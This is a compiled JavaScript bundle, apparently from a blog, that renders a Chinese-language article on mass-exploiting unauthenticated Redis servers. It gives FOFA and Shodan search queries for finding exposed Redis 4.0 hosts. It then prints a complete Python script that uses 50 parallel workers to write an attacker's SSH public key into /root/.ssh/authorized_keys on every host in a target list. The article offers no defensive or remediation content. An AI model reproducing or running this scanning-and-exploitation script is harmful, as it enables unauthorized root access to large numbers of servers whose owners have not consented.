{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[98],{2103:function(s,t,a){\"use strict\";a.r(t);var e=a(75),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":s.$parent.slotKey}},[e(\"h1\",{attrs:{id:\"redis未授权访问漏洞的批量攻击\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#redis未授权访问漏洞的批量攻击\"}},[s._v(\"#\")]),s._v(\" redis未授权访问漏洞的批量攻击\")]),s._v(\" \"),e(\"p\",[s._v(\"  Redis在默认情况下，会绑定在0.0.0.0:6379。如果没有采取相关的安全策略，比如添加防火墙规则、避免其他非信任来源IP访问等，这样会使Redis服务完全暴露在公网上。如果在没有设置密码认证(一般为空)的情况下，会导致任意用户在访问目标服务器时，可以在未授权的情况下访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行文件的读写等操作。攻击者可以成功地将自己的ssh公钥写入到目标服务器的 /root/.ssh文件夹下的authotrized_keys文件中，进而可以使用对应地私钥直接使用ssh服务登录目标服务器。\")]),s._v(\" \"),e(\"h2\",{attrs:{id:\"fofa查询\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#fofa查询\"}},[s._v(\"#\")]),s._v(\" FOFA查询\")]),s._v(\" \"),e(\"h4\",{attrs:{id:\"语法\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#语法\"}},[s._v(\"#\")]),s._v(\" 语法\")]),s._v(\" \"),e(\"p\",[e(\"code\",[s._v('port=\"6379\" && \"redis_version:4.0.3\" && country=\"CN\"')])]),s._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(888),alt:\"\"}})]),s._v(\" \"),e(\"h2\",{attrs:{id:\"shodan查询\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#shodan查询\"}},[s._v(\"#\")]),s._v(\" Shodan查询\")]),s._v(\" \"),e(\"h4\",{attrs:{id:\"语法-2\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#语法-2\"}},[s._v(\"#\")]),s._v(\" 语法\")]),s._v(\" \"),e(\"p\",[e(\"code\",[s._v('port:6379 \"redis_version:4.0\"')])]),s._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(889),alt:\"\"}})]),s._v(\" \"),e(\"h2\",{attrs:{id:\"应用\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#应用\"}},[s._v(\"#\")]),s._v(\" 应用\")]),s._v(\" \"),e(\"p\",[s._v(\"  普通的应用方式就不在此介绍了，这里主要想讲一下如何批量进行漏洞利用。脚本代码如下：\")]),s._v(\" \"),e(\"div\",{staticClass:\"language-python3 line-numbers-mode\"},[e(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[e(\"code\",[s._v(\"import redis\\nfrom multiprocessing import Pool\\nimport subprocess\\n\\nWORKERS = 50\\n\\n\\ndef preDetect(host):\\n    try:\\n        r = redis.StrictRedis(host=host, port=6379, db=0, socket_timeout=1)\\n        return host\\n    except Exception:\\n        return False\\n\\n\\ndef evil(host: str):\\n    host = preDetect(host)\\n    if host == \\\"False\\\":\\n        return False\\n    else:\\n        cmd = \\\"cat key.txt | redis-cli -h %s -x set crack > log.txt 2>&1\\\" % host\\n        subprocess.call(cmd, shell=True, stderr=None)\\n        r = redis.StrictRedis(host=host, port=6379, db=0)\\n        try:\\n            r.config_set('dir', '/root/.ssh')\\n        except Exception as e:\\n            return False\\n        r.config_set('dbfilename', 'authorized_keys')\\n        try:\\n            r.save()\\n            print(host)\\n        except Exception as e:\\n            return False\\n\\n\\nif __name__ == \\\"__main__\\\":\\n    with open(\\\"targets.txt\\\") as targets:\\n        targets = targets.read().splitlines()\\n    with Pool(processes=WORKERS) as executor:\\n        executor.map(evil, targets)\\n\")])]),s._v(\" \"),e(\"div\",{staticClass:\"line-numbers-wrapper\"},[e(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"29\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"30\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"31\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"32\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"33\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"34\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"35\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"36\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"37\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"38\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"39\")]),e(\"br\"),e(\"span\",{staticClass:\"line-number\"},[s._v(\"40\")]),e(\"br\")])]),e(\"h2\",{attrs:{id:\"验证截图\"}},[e(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#验证截图\"}},[s._v(\"#\")]),s._v(\" 验证截图\")]),s._v(\" \"),e(\"p\",[e(\"img\",{attrs:{src:a(890),alt:\"\"}})])])}),[],!1,null,null,null);t.default=n.exports},888:function(s,t,a){s.exports=a.p+\"assets/img/fofa.33ef733d.png\"},889:function(s,t,a){s.exports=a.p+\"assets/img/Shodan.276c4945.png\"},890:function(s,t,a){s.exports=a.p+\"assets/img/result.3018d1b6.png\"}}]);","extractedComments":[]}